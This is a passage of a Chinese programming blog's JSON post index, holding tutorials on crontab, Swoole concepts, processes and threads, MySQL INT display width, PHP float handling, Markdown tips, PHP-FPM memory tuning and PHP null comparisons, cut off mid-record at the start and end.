快速上手","slug":"crontab-quick-start","date":"2020-10-27T15:22:29.000Z","updated":"2020-11-20T15:09:20.436Z","comments":true,"path":"crontab-quick-start/","link":"","permalink":"https://www.0x2beace.com/crontab-quick-start/","excerpt":"Crontab 是Unix 系统中基于时间的任务管理工具。","text":"Crontab 是Unix 系统中基于时间的任务管理工具。 这个命令与传统的 Unix 命令不一样，下面会一一介绍其规则及其用法。 crontab 还是 croncrontab 还是 cron？初次接触 crontab 的同学可能会被这两个词给绕晕。 其实可以这样来理解：crontab就是 cron服务的命令行工具，而cron则是背后处理crontab投递任务的服务。 文件格式crontab 命令是以固定的时间格式来使用的， 表示意义 分钟 小时 日期 月份 周 命令 范围 0～59（*） 0～23（*） 1～31（*） 1～12（*） 0～7（*） 需要执行的命令 另外还有一些特殊字符具有特殊含义： * 表示任何时刻都接收。举个栗子：* 12 * * * 表示不论何月、何日的星期几的十二点都执行指定命令。 常用实例每分钟执行一次： 1*&#x2F;1 * * * * 或者 * * * * * 每五分钟执行一次： 1*&#x2F;5 * * * * 每小时执行一次： 10 * * * * 或者 0 *&#x2F;1 * * * 每天执行一次： 10 0 * * * 每周执行一次： 10 0 * * 0 每月执行一次： 10 0 1 * 0 如何使用初次接触crontab 命令时，我也比较纳闷，这个命令倒底是如何使用的？ 使用 crontab 有两种方式： crontab -e：直接接受标准输入（键盘）上键入的命令，并将它们载入crontab。 crontab file：将file 作为crontab 的任务列表文件并载入crontab 第一种方式没什么好说的，直接在终端添加 crontab 任务就行了，下面简单说一下第二种（其实两者的核心都是一样的）。 创建crontab 文件首先创建一个文件，该文件的内容以功能描述、执行时间、执行任务 这几部分组成。 其中，前两者并不是一定需要，只是为了方便自己日后或其他人能快速知道这个任务具体是做什么的，# 表示注释。 示例，创建一个名称为script_cron 的crontab 文件： 12# 每分钟执行一次 script.php 脚本* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php 运行crontab为了提交刚刚创建的crontab 文件，可以把这个新创建的文件名称作为crontab命令的参数： 1$ crontab script_cron 列出cron 服务使用-l 参数列出crontab文件： 123$ crontab -l# 每分钟执行一次 script.php 脚本* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php 编辑cron 服务1$ crontab -e 删除cron 服务1$ crontab -r 常见问题crontab 没有立即生效新创建的cron 任务，不会马上执行，至少要过两分钟才执行。 如果希望能马上执行，可以重启 crontab 。 12345&#x2F;&#x2F; Ubuntu：$ service cron restart &#x2F;&#x2F; Centos$ service crond restart crontab 压根没执行有时候会遇到直接在命令行中可以执行任务，但是定时任务却怎么都不执行， 这时首先需要确认 cron 服务是否正常： 12345&#x2F;&#x2F; Ubuntu：$ service cron status &#x2F;&#x2F; Centos$ service crond status 然后确认需要执行的任务是否包含路径，如果包含请使用全局路径。 最后重启 cron 服务，通常到这里就已经可以正常执行了，如果还不行，尝试引入环境变量： 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php crontab 无权限执行需要注意的是crontab 任务的调度，只有 root 和任务所有者拥有权限。 如果想要编辑/查看/删除其他用户的任务，可以使用以下命令： 1$ crontab -u &lt;username&gt; &lt;选项&gt; 常用选项：-e：编辑任务-l：查看任务-r：删除任务 查看 crontab 任务执行情况当定时任务在指定时间执行时，会同步输出类似日志： 12$ tail -f &#x2F;var&#x2F;log&#x2F;syslogNov 19 12:47:01 gigabit CRON[14521]: (root) CMD (&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php) 此时就可以肯定任务调度正常。 上面那种方式确实有效，但是并不方便，那么有没有更好的方式呢？ crontab 默认没有任务的执行记录日志，但是可以通过其他方式手动创建日志文件。 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php &gt;&gt; &#x2F;var&#x2F;log&#x2F;cron.log 2&gt;&amp;1 在script.php 脚本最后面增加一次输出，这样每次执行完脚本就会将输出重定向至cron.log 日志文件了。 参考链接 crontab用法与实例 19. crontab 定时任务 Linux Crontab命令定时任务基本语法与操作教程-VPS/服务器自动化","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Crontab","slug":"Crontab","permalink":"https://www.0x2beace.com/tags/Crontab/"}]},{"title":"Swoole 常见概念整理","slug":"sorting-out-some-concepts-in-swoole","date":"2020-10-25T12:24:52.000Z","updated":"2020-11-07T08:11:48.092Z","comments":true,"path":"sorting-out-some-concepts-in-swoole/","link":"","permalink":"https://www.0x2beace.com/sorting-out-some-concepts-in-swoole/","excerpt":"Swoole 是一个非常优秀的PHP 的协程高性能网络通信引擎。 在学习过程中，遇到了一些新或旧的概念，在此整理一下。","text":"Swoole 是一个非常优秀的PHP 的协程高性能网络通信引擎。 在学习过程中，遇到了一些新或旧的概念，在此整理一下。 长连接/短连接长连接： 客户端和服务端建立连接后不进行断开，之后客户端再次访问这个服务器上的内容时，继续使用这一条连接通道。短连接： 客户端和服务端建立连接，发送完数据后立马断开连接。下次要取数据，需要再次建立连接。 串行/并行/并发串行：执行多个任务时，各个任务按顺序执行，完成一个之后才能进行下一个。并行：多个任务在同一时刻发生并执行。并发：同一时刻需要执行N 个任务 IO（Input/Output，输入输出）在计算机中，输入 / 输出（即 IO）是指信息处理系统（比如计算机）和外部世界（可以是人或其他信息处理系统）的通信。 输入是指系统接收的信号或数据，输出是指从系统发出的数据或信号。 涉及到IO 操作的通常有磁盘、网络、文件等。 同步/异步同步和异步是一种消息通信机制。其关注点在于 被调用者返回 和 结果返回 之间的关系， 描述对象是被调用对象的行为。 同步：在发出一个同步调用后，没有得到结果返回之前，该调用就不会返回，只有等待结果返回之后才会继续执行后续操作。异步：发出调用，直接返回。异步可以通过状态、回调、通知调用者结果，可以先执行其他操作，直到回调结果返回之后，再回来执行回调那部分的操作。 阻塞/非阻塞阻塞和非阻塞是一种业务流程处理方式。关注点在于调用发生时 调用者状态 和 被调用者返回结果 之间的关系。 描述的是等待结果时候调用者的状态。 此时结果可能是同步返回的，也能是异步返回。 阻塞：在结果返回之前，该线程会被挂起，后续代码只有在结果返回后才能执行。非阻塞：在不能立刻获取结果前，该调用不会阻塞当前线程。 同步阻塞/非同步阻塞实际编程中，通过线程实现进程的同步非阻塞，通过协程实现线程的同步非阻塞。 同步阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），你一直等待老板给你结果，什么事也不做（阻塞）。 同步非阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），等电话的过程中你还一边嗑瓜子（非阻塞）。 异步阻塞/异步非阻塞异步阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂了电话后（结束调用）, 除了等老板电话通知结果，什么事情也不做（阻塞）。 异步非阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂电话后（结束调用），一遍等电话，一遍嗑瓜子。（非阻塞） 参考链接 Swoole 中涉及的一些基本概念","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"初始进程与线程","slug":"initial-process-and-thread","date":"2020-10-24T13:50:46.000Z","updated":"2020-10-24T13:53:41.808Z","comments":true,"path":"initial-process-and-thread/","link":"","permalink":"https://www.0x2beace.com/initial-process-and-thread/","excerpt":"关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。","text":"关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。 操作系统下的进程与线程在正式介绍进程和线程之前，从操作系统的角度了解一下。 众所周知，现代的操作系统（Mac OS X，UNIX，Linux，Windows等）都是支持“多任务”的操作系统。 那么什么是“多任务”呢？简单的说，多任务就是同时运行多个任务，比如一边听歌，一边写博客。 多核 CPU可以直接同时运行多个任务，而对于单核 CPU 来说，只能让系统轮流执行每个任务，因为任务之间切换很快，在宏观上看上去就是同时执行的了。 对于操作系统来说，一个任务就是一个进程。而有的进程同时做几件事情，也就是同时运行多个子任务，我们把进程内的这类子任务称为线程。 由于每个进程至少要干一件事情，所以，一个进程至少有一个线程。 PHP 默认是执行单任务的进程，也就是只有一个线程。如果我们要同时执行多个任务怎么办？ 有两种解决方案： 启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。 启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。 多线程线程是最小的执行单元，而进程由至少一个线程组成，知道这一点后，再来理解多线程就不难了。 多线程就是指一个进程中同时有多个线程正在执行。 为什么要使用多线程？对于一个程序来说，很多操作事非常耗时的，如数据库I/O操作、文件读写等。如果使用单线程，那么就只能等待该线程处理完这些操作之后，才能继续往下执行其他操作。 而如果使用多线程，就可以将耗时的那部分操作通过其他线程去执行，从而提高程序执行效率。 多线程的缺点 使用过多线程会过度消耗系统资源，因为创建线程需要开辟新的内存。 影响系统性能，操作系统需要来回对多线程进行切换。 同时还需要考虑线程异常（挂起、中止）时可能会对造成程序的影响。 总结：多线程是异步的，分别创建N 个线程并不能说明他们就是在同时运行，实际上是操作系统在各个线程之间来回切换，并且切换速度非常快，这也就造成了在宏观上给我们同时运行的错觉。 多进程多进程就是指计算机同时执行多个进程。 多进程还是多线程下面引用一个知乎上的回答，非常通俗的解释了选择多进程还是多线程的问题。 单进程单线程：一个人在一个桌子上吃菜。 单进程多线程：多个人在同一个桌子上一起吃菜。 多进程单线程：多个人每个人在自己的桌子上吃菜。 多线程的问题是多个人同时吃一道菜的时候容器发生争抢。例如两个人同时夹一个菜，一个人刚伸出筷子，结果伸到的时候菜已经被夹走了。通俗点说也就说资源共享容器发生冲突争抢。 对于Windows 系统来说，“开桌子”的开销很大，因此Windows 鼓励大家在一个桌子上吃菜。因此 Windows 多线程的学习重点是资源争抢与同步方面的问题。 而对于Linux 系统来说，“开桌子”的开销很小，因为Linux 鼓励大家尽量每个人都开自己的桌子吃菜。但这同事也带来了新的问题：两个人坐在不同的桌子上，说话不方便。因为，Linux 多线程的学习重点是进程之间的通讯方式。 参考链接 进程和线程 多进程和多线程的概念 多线程有什么用？——知乎","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"进程","slug":"进程","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"MySQL Integer类型与INT(11)详解","slug":"mysql-integer-type-and-int-11-detailed-explanation","date":"2020-10-23T10:39:10.000Z","updated":"2020-10-23T10:39:49.036Z","comments":true,"path":"mysql-integer-type-and-int-11-detailed-explanation/","link":"","permalink":"https://www.0x2beace.com/mysql-integer-type-and-int-11-detailed-explanation/","excerpt":"MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。","text":"MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。 每种整数类型所需的存储空间和范围如下：|类型|字节|最小值(有符号)|最大值(有符号)|最小值(无符号)|最大值(无符号)||-|-|-|-|-|-||TINYINT|1|-128|127|0|255||SMALLINT|2|-32768|32767|0|65535||MEDIUMINT|3|-8388608|8388607|0|16777215||INT|4|-2147483648|2147483647|0|4294967295||BIGINT|8|-9223372036854775808|(9223372036854775807|0|18446744073709551615| 有无限制的区别在创建数据表时，通常会看见 int(11)和int这样的写法，这两者有什么区别，各自又代表什么意思呢？ 对应Integer 类型而言，仅表示字段的显示宽度。 对于DECIMAL类型，表示数字的总数。 对于字符字段，这是可以存储的最大字符数，例如VARCHAR（20）可以存储20个字符。 显示宽度并不影响可以存储在该列中的最大值。int(3)和int(11) 所能存储的最大范围是一样的。 将某个字段设置成INT(20)并不意味着将能够存储20位数字，这个字段最终能存储的最大范围还是 INT 的范围。 示例创建一张临时表： 12345CREATE TABLE tmp_table_a ( id INT(3) NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); 查看表结构： 1234567mysql&gt; desc tmp_table_a;+-------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+-------------+------+-----+---------+----------------+ 插入超过”长度”的数字： 1INSERT INTO tmp_table_a(id, name) VALUES(123456, &quot;boo&quot;); 查看结果，发现数字并没有插入失败： 1234567mysql&gt; select * from tmp_table_a;+--------+------+| id | name |+--------+------+| 123456 | boo |+--------+------+1 row in set (0.00 sec) 有无符号的区别那么问题来了，既然加不加数字并没有什么区别，那为什么还多此一举呢？ 这是因为“正常”情况下确实没有什么区别，只有当字段设置为UNSIGNED ZEROFILL 属性时，为INT 增加数字才会有意义。 表示如果要存储的数字少于N 个字符，则这些数字将在左侧补零。 示例创建一张 UNSIGNED ZEROFILL 的数据表： 12345CREATE TABLE tmp_table_b ( id INT(3) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); 查看表结构： 1234567mysql&gt; desc tmp_table_b;+-------+--------------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+--------------------------+------+-----+---------+----------------+| id | int(3) unsigned zerofill | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+--------------------------+------+-----+---------+----------------+ 插入记录： 1INSERT INTO tmp_table_b(id, name) VALUES(1, &quot;boo&quot;); 查看记录： 123456mysql&gt; select * from tmp_table_b;+-----+------+| id | name |+-----+------+| 001 | boo |+-----+------+ 总结 对于Integer 类型而言，“数字”并不会限制其能存储的最大范围。 有无符号，不仅会限制其能存储的最大范围，还可以配置“数字”自动补零。 参考链接 MySQL Integer类型与INT(11)","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windows 如何安装 Swoole？","slug":"how-to-install-swoole-on-windows","date":"2020-10-21T11:56:53.000Z","updated":"2020-11-26T10:19:33.578Z","comments":true,"path":"how-to-install-swoole-on-windows/","link":"","permalink":"https://www.0x2beace.com/how-to-install-swoole-on-windows/","excerpt":"Swoole 是一个 PHP 的协程高性能网络通信引擎。","text":"Swoole 是一个 PHP 的协程高性能网络通信引擎。 目前仅支持 Linux(2.3.32 以上内核)、FreeBSD、MacOS 三种操作系统，它并不支持直接在 Windows 下安装，因为Windows 系统默认没有以下软件： gcc-4.8 或更高版本 make autoconf 如果一定要在Windows 系统中使用，则可以使用 CygWin 或 WSL(Windows Subsystem for Linux) 。 这篇笔记并不介绍如何在Windows 系统中，安装Cygwin，如果需要，可以参考Cygwin 快速上手 。 需要注意的是，在安装Cygwin 时，记得勾选以下软件包： gcc、gcc++ autoconf php-devel pcre2 安装Swoole1. 可以通过以下方式下载 Swoole github pecl gitee 2. 从源码编译安装下载源代码包后，将其拷贝至 Cygwin 的home 目录，解压并进入文件夹。 1tar -zxvf swoole-src.tgz 编译安装： 1234cd swoole-src &amp;&amp; \\phpize &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install 如果因为某个软件包缺失而导致编译安装失败，则可以重新安装 Cygwin（重新安装不用卸载之间的版本，直接在此安装就好了）。 3. 启用扩展编译安装到系统成功后，需要在 php.ini 中加入一行 extension=swoole.so 来启用 Swoole 扩展。 需要注意的是，通过这种方式安装的Swoole，最终存在于Cygwin 环境中，与宿主机中的PHP 版本无关。 通过php -m | grep swoole查看是否安装成功。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP 常见浮点数操作","slug":"php-common-floating-point-operations","date":"2020-10-20T11:24:23.000Z","updated":"2020-10-20T11:35:47.611Z","comments":true,"path":"php-common-floating-point-operations/","link":"","permalink":"https://www.0x2beace.com/php-common-floating-point-operations/","excerpt":"浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。","text":"浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。 保留N位小数做四舍五入想要保留N 位小数同时做四舍五入的方式还是挺多的，下面列举常用的几种。 sprintfsprintf 函数用于返回一个格式化之后的字符串。 123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;, $num); &#x2F;&#x2F; 22.36 %.2f 是目标格式，其中2 表示2 位，f表示视为浮点数。 roundround 函数用于对浮点数进行四舍五入。 还可以通过传入参数，决定从第几位开始四舍五入。如果没有参数，默认从小数点后一位开始四舍五入。 1234&lt;?phpecho round(3.4); &#x2F;&#x2F; 3echo round(3.5); &#x2F;&#x2F; 4echo round(22.356, 2); &#x2F;&#x2F; 22.36 保留N位小数不做四舍五入123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;,substr(sprintf(&quot;%.3f&quot;, $num), 0, -1)); &#x2F;&#x2F; 22.35 获取小数位长度123&lt;?php$num &#x3D; 22.356;echo strlen(substr(strrchr($num, &quot;.&quot;), 1)); &#x2F;&#x2F; 3","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"关于 Markdown 的一些技巧","slug":"some-tips-about-markdown","date":"2020-10-19T14:04:23.000Z","updated":"2020-10-20T11:23:53.460Z","comments":true,"path":"some-tips-about-markdown/","link":"","permalink":"https://www.0x2beace.com/some-tips-about-markdown/","excerpt":"这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。","text":"这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。 什么是Markdown？ Markdown 是一种轻量级标记语言，创始人为约翰·格鲁伯。它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。 —— 维基百科 Markdown 高级技巧在Markdown 中，可以直接插入 HTML，目前支持的HTML 元素有： &lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sub&gt; &lt;sup&gt; &lt;br&gt; 等 键盘标签可以使用&lt;kbd&gt;标签使文本看起来像按钮，这与常规反引号文本略有不同。 Copy code with Control + C 可视化差异可以使用反引号可视化差异，并diff根据需要突出显示红色或绿色的线。 12310 PRINT “BASIC IS COOL”- 20 GOTO 11+ 20 GOTO 10 隐藏不必要的输出添加冗长的错误日志或冗长程序输出的问题可以解决的错误有帮助的，但如果它占用页的垂直空间，可以考虑使用&lt;details&gt;和&lt;summary&gt;标签。 12345678910&lt;details&gt;&lt;summary&gt;git clone 成功，点击查看详情信息&lt;&#x2F;summary&gt;&lt;pre&gt;Cloning into &#39;php-markdown-blog&#39;...remote: Enumerating objects: 67, done.remote: Counting objects: 100% (67&#x2F;67), done.remote: Compressing objects: 100% (55&#x2F;55), done.remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0Unpacking objects: 100% (67&#x2F;67), done.&lt;&#x2F;details&gt; git clone 成功，点击查看详情信息 Cloning into 'php-markdown-blog'... remote: Enumerating objects: 67, done. remote: Counting objects: 100% (67/67), done. remote: Compressing objects: 100% (55/55), done. remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0 Unpacking objects: 100% (67/67), done. 使图像文字居中HTML 中的&lt;div align=&quot;center&quot;&gt; 居然可以神奇的应用在 Markdown 中，然所有内容居中。 1234&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;dunetocat.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;p&gt;This is some centered text.&lt;&#x2F;p&gt;&lt;&#x2F;div&gt; This is some centered text. 较小的文字使用&lt;sub&gt;、&lt;sup&gt;标签，可以使文字变小，非常适合在图像下面添加描述。 12345&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;megacat-2.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;br&gt;&lt;sup&gt;&lt;strong&gt;Fig 1:&lt;&#x2F;strong&gt; Megatocat into action&lt;&#x2F;sup&gt;&lt;&#x2F;div&gt;View more octocats on the [Octodex](https:&#x2F;&#x2F;octodex.github.com&#x2F;)! Fig 1: Megatocat into action View more octocats on the Octodex 参考链接 GitHub ProTips","categories":[{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"}],"tags":[{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"}]},{"title":"PHP-FPM 优化——占用内存大不释放","slug":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release","date":"2020-10-18T07:56:45.000Z","updated":"2020-10-18T07:59:01.020Z","comments":true,"path":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","link":"","permalink":"https://www.0x2beace.com/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","excerpt":"在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。","text":"在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。 这里说的内存，指的是物理运行内存，而不是虚拟内存（Swap）。 LNMP架构中PHP是运行在FastCGI模式下，按照官方的说法，php-cgi会在每个请求结束的时候会回收脚本使用的全部内存，但是并不会释放给操作系统，而是继续持有以应对下一次PHP请求。而php-fpm是 FastCGI进程管理器，用于控制php的内存和进程等。 所以，解决的办法就是通过php-fpm 优化总的进程数和单个进程占用的内存，从而解决php-fpm 进程占用内存大和不释放内存的问题。 查看当前占用情况如果发现Web 应用出现严重卡顿，请求超时等问题，首先检查一下内存的占用情况。常用的命令有：Top、Glances、Free 等。 使用Glances 或者 Top 命令查看进程，然后按下按键 M，可以查看主机当前的内存占用情况，按照占用内存由多到少排序。 也可以使用以下命令查看当前 php-fpm 总进程数： 1ps -ylC php-fpm --sort:rss 其中 rss 就是内存占用情况。 查看当前php-fpm 进程的内存占用情况及启动时间： 1ps -e -o &#39;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#39;|grep www|sort -nrk5 可以看到无论哪一种方式，结果都是一样的。 查看当前php-fpm进程平均占用内存情况： 12ps --no-headers -o &quot;rss,cmd&quot; -C php-fpm | awk &#39;&#123; sum+&#x3D;$1 &#125; END &#123; printf (&quot;%d%s\\n&quot;, sum&#x2F;NR&#x2F;1024,&quot;M&quot;) &#125;&#39;&#x2F;&#x2F; 22M 优化配置解决上面那个问题的核心就是 php-fpm 配置中的 max_requests。 即当一个 PHP-CGI 进程处理的请求数累积到 max_requests 个后，自动重启该进程，这样达到了释放内存的目的了。 一般来说一个php-fpm 进程占用的内存为30M-40M，所以根据自身实际情况作判断，有以下两种情况： 实际结果是大于 30M - 40M，那么需要让 php-fpm “早一些“释放内存，max_requests 的数值改小一些。 实际结果是小于 30M - 40M，则可以让 php-fpm “晚一些“释放内存，max_requests的数值改大一些。 参考链接 Linux的php-fpm优化心得-php-fpm进程占用内存大和不释放内存问题","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"对于NULL、空、0、false等数据类型的理解","slug":"understanding-of-data-types-such-as-null-empty-0-false-etc","date":"2020-10-17T09:21:51.000Z","updated":"2020-10-17T09:22:32.323Z","comments":true,"path":"understanding-of-data-types-such-as-null-empty-0-false-etc/","link":"","permalink":"https://www.0x2beace.com/understanding-of-data-types-such-as-null-empty-0-false-etc/","excerpt":"之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。","text":"之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。 常见的“空”有以下这些： 整形0：0 字符1：1 字符空：”” 字符零：”0” 空数组：[] true false null NUll 上面的那些都好理解，都是常见的，重点介绍一下NULL。 NULL 是什么？ Null是在计算机具有保留的值，可以用于指针不去引用对象，现在很多程序都会使用指针来表示条件，但是在不同的语言中，含义是不一样的。 这里我们只介绍 PHP 中的 NULL。 在 PHP 中，表示一个变量没有赋值、或者是被赋值的值为 NULL，以及被 unset 的。 使用PHP 函数对变量进行比较： 表达式 gettype() empty() is_null() isset() boolean : if($x) $x = &quot;&quot;; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = &quot;1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;0&quot;; string TRUE FALSE TRUE FALSE $x = &quot;-1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;php&quot;; string FALSE FALSE TRUE TRUE $x = &quot;true&quot;; string FALSE FALSE TRUE TRUE $x = &quot;false&quot;; string FALSE FALSE TRUE TRUE 松散判断 == TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE 1 TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE FALSE TRUE TRUE -1 TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE &quot;1&quot; TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE TRUE FALSE TRUE array() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE &quot;php&quot; TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE 严格比较 === TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE &quot;1&quot; FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE &quot;php&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE 参考链接PHP 类型比较表","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Vim 